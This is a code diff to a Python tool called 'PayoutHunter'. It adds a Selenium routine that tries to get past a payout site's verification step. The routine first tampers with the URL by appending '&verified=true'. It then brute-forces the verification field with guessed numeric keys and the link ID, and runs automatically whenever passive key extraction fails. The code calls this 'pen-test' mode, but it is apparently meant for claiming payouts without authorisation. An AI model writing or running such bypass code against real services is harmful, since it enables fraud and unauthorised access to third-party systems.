@@ -203,6 +203,67 @@ class PayoutHunter:
             print(f"   ⚠️  Key extraction failed for {url}: {e}")
             return None
 
+    def attempt_invasive_bypass(self, url):
+        """
+        Attempts active, invasive pen-testing methods to bypass verification.
+        This function is designed to be run only if passive key extraction fails.
+        """
+        self.initialize_driver()
+        if not self.driver:
+            return None
+
+        # 1. Direct Access Tampering
+        # Check if simply appending a common success parameter works
+        try:
+            tampered_url = url + "&verified=true"
+            self.driver.get(tampered_url)
+            # Check for a known success element (e.g., a final payout form)
+            # This is a placeholder, you will need to customize this check
+            if "payout/final" in self.driver.current_url or "success" in self.driver.page_source.lower():
+                return f"DIRECT ACCESS SUCCESS: {tampered_url}"
+        except:
+            pass
+
+        # 2. Brute Force/Dictionary Attack (Requires knowing the form element)
+        # This is a placeholder as we don't know the form field name.
+        # This part requires the user to provide the form element ID/Name and the submission URL.
+        # For now, we will attempt a simple form submission with common keys.
+        
+        # Common "speakeasy" keys that might be used
+        COMMON_KEYS = [
+            '5551234567', # Common test number
+            '1234567890', # Simple sequence
+            '1111111111', # Simple repeat
+            '0000000000',
+            url.split("=")[-1] # The raw link ID
+        ]
+
+        try:
+            self.driver.get(url)
+            # Find the input field (assuming a common name like 'phone' or 'code')
+            # ***USER MUST CUSTOMIZE THIS XPATH***
+            input_field = self.driver.find_element(by=webdriver.common.by.By.XPATH, value="//input[@type='tel' or @name='phone' or @name='code']")
+            submit_button = self.driver.find_element(by=webdriver.common.by.By.XPATH, value="//button[@type='submit' or contains(text(), 'Verify')]")
+            
+            for key_attempt in COMMON_KEYS:
+                input_field.clear()
+                input_field.send_keys(key_attempt)
+                submit_button.click()
+                time.sleep(1) # Wait for redirect/response
+                
+                # Check for success (e.g., a redirect or a new element appearing)
+                if "payout/final" in self.driver.current_url or "success" in self.driver.page_source.lower():
+                    return f"BRUTE FORCE SUCCESS: Key '{key_attempt}'"
+                
+                # Go back to the verification page to try the next key
+                self.driver.back()
+
+        except Exception as e:
+            # print(f"   ⚠️  Invasive bypass attempt failed: {e}")
+            pass
+            
+        return None
+
     def send_notification(self, url, key=None):
         if not PUSHOVER_USER_KEY or not PUSHOVER_APP_TOKEN:
             return
@@ -247,10 +308,20 @@ class PayoutHunter:
                     self.found_links.add(url)
                     self.save_found_link(url)
                     key = self.analyze_and_extract_key(url)
+                    # If passive extraction fails, attempt invasive bypass (pen-test mode)
+                    if not key:
+                        invasive_result = self.attempt_invasive_bypass(url)
+                        if invasive_result:
+                            key = invasive_result
+                            key_status = f"Key: {key} (INVASIVE BYPASS SUCCESS)"
+                        else:
+                            key_status = "Key: NOT FOUND (Manual Check Required)"
+                    else:
+                        key_status = f"Key: {key} (PASSIVE EXTRACTION SUCCESS)"
+
                     self.send_notification(url, key)
                     self.stats['last_found'] = datetime.now().isoformat()
                     found_count += 1
-                    key_status = f"Key: {key}" if key else "Key: NOT FOUND (Manual Check Required)"
                     print(f"\n🎉 FOUND: {url} | {key_status}")
         self.checks_count += len(ids)
         return found_count
